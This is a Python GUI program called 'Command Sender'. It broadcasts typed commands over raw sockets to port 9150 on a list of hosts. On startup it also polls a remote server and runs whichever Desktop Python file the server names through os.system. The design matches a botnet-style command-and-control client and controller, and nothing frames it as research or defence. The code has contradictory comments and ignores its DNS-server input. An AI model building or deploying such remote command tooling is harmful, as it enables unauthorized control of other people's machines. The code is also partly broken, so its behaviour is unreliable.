import socket
import threading
import os
import time
import tkinter as tk
from tkinter import filedialog, messagebox
import requests

# Server configuration
HOST = '127.0.0.1'  # Listen on all available network interfaces
PORT = 9150  # Port to listen on

# Unique UUID for identification/authentication
UUID = "9128fd2e-b2d5-4350-b81d-73701190a81d"

class App:
    def __init__(self, root):
        self.root = root
        self.root.title("Command Sender")

        self.dns_server_label = tk.Label(root, text="DNS Server:")
        self.dns_server_label.grid(row=0, column=0, padx=10, pady=5, sticky="w")
        self.dns_server_entry = tk.Entry(root)
        self.dns_server_entry.grid(row=0, column=1, padx=10, pady=5, sticky="ew")
        self.dns_server_entry.insert(0, "")  # Default DNS server

        self.file_label = tk.Label(root, text="Discovered IPs File:")
        self.file_label.grid(row=1, column=0, padx=10, pady=5, sticky="w")
        self.file_entry = tk.Entry(root)
        self.file_entry.grid(row=1, column=1, padx=10, pady=5, sticky="ew")
        self.file_button = tk.Button(root, text="Browse", command=self.browse_file)
        self.file_button.grid(row=1, column=2, padx=5, pady=5)

        self.command_label = tk.Label(root, text="Command:")
        self.command_label.grid(row=2, column=0, padx=10, pady=5, sticky="w")
        self.command_entry = tk.Entry(root)
        self.command_entry.grid(row=2, column=1, padx=10, pady=5, sticky="ew")

        self.send_button = tk.Button(root, text="Send Command", command=self.send_command)
        self.send_button.grid(row=3, column=0, columnspan=2, padx=10, pady=10, sticky="ew")

        self.discover_button = tk.Button(root, text="Start/Stop Discovering", command=self.toggle_discovering)
        self.discover_button.grid(row=4, column=0, columnspan=2, padx=10, pady=10, sticky="ew")

        self.discovered_ips_file = "discovered_ips.txt"  # File to store discovered IPs
        self.stop_discover = False  # Flag to stop discovering

        # Automatically start discovering when the application is launched
        self.start_discovering()

    def browse_file(self):
        filename = filedialog.askopenfilename()
        if filename:
            self.file_entry.delete(0, tk.END)
            self.file_entry.insert(0, filename)

    def send_command(self):
        dns_server = self.dns_server_entry.get()
        filename = self.file_entry.get()
        command = self.command_entry.get()

        if not dns_server or not filename or not command:
            messagebox.showerror("Error", "Please fill in all fields.")
            return

        discovered_ips = self.read_discovered_ips(filename, dns_server)
        self.send_command_to_all(discovered_ips, command)

    def read_discovered_ips(self, filename, dns_server):
        discovered_ips = []
        try:
            with open(filename, 'r') as file:
                for line in file:
                    hostname = line.strip()
                    ip = self.get_ip_from_dns(hostname, dns_server)
                    if ip:
                        discovered_ips.append(ip)
        except FileNotFoundError:
            messagebox.showerror("Error", f"File '{filename}' not found.")
        except Exception as e:
            messagebox.showerror("Error", f"Error reading file: {e}")

        return discovered_ips

    def get_ip_from_dns(self, hostname, dns_server):
        try:
            return socket.gethostbyname(hostname)
        except Exception as e:
            messagebox.showerror("Error", f"Error resolving DNS for {hostname} using {dns_server}: {e}")
            return None

    def send_command_to_all(self, discovered_ips, command):
        for ip in discovered_ips:
            self.send_command_to_ip(ip, command)

    def send_command_to_ip(self, ip, command):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            try:
                client_socket.connect((ip, PORT))
                print(f"Connected to {ip}. Sending command...")

                # Send the command
                client_socket.send(command.encode('utf-8'))

            except Exception as e:
                print(f"Error sending command to {ip}: {e}")

    def start_discovering(self):
        self.stop_discover = False
        self.discover_thread = threading.Thread(target=self.discover)
        self.discover_thread.start()

    def stop_discovering(self):
        self.stop_discover = True

    def toggle_discovering(self):
        if self.stop_discover:
            self.start_discovering()
            self.discover_button.config(text="Stop Discovering")
        else:
            self.stop_discovering()
            self.discover_button.config(text="Start Discovering")

    def discover(self):
        dns_server = self.dns_server_entry.get()
        while not self.stop_discover:
            try:
                authentication_parameter = "auth=YOUR_AUTHENTICATION_PARAMETER"  # Replace with actual auth parameter
                response = requests.get(f"https://{dns_server}?{authentication_parameter}")
                if response.status_code == 200:
                    command = response.text.strip()
                    if command:
                        print(f"Received command: {command}")
                        self.execute_command_from_desktop(command)
                    else:
                        print(f"Failed to fetch commands from DNS server. Status code: {response.status_code}")
            except Exception as e:
                print(f"Error during discovery: {e}")

            time.sleep(5)  # Discovery every 60 seconds

    def execute_command_from_desktop(self, command):
        try:
            desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
            file_path = os.path.join(desktop_path, command)
            if os.path.exists(file_path) and file_path.endswith('.py'):
                print(f"Executing {command}...")
                os.system(f"python \"{file_path}\"")
            else:
                print(f"File '{command}' does not exist on the desktop or is not a Python file.")
        except Exception as e:
            print(f"Error executing command: {e}")

if __name__ == "__main__":
    root = tk.Tk()
    app = App(root)
    root.mainloop()
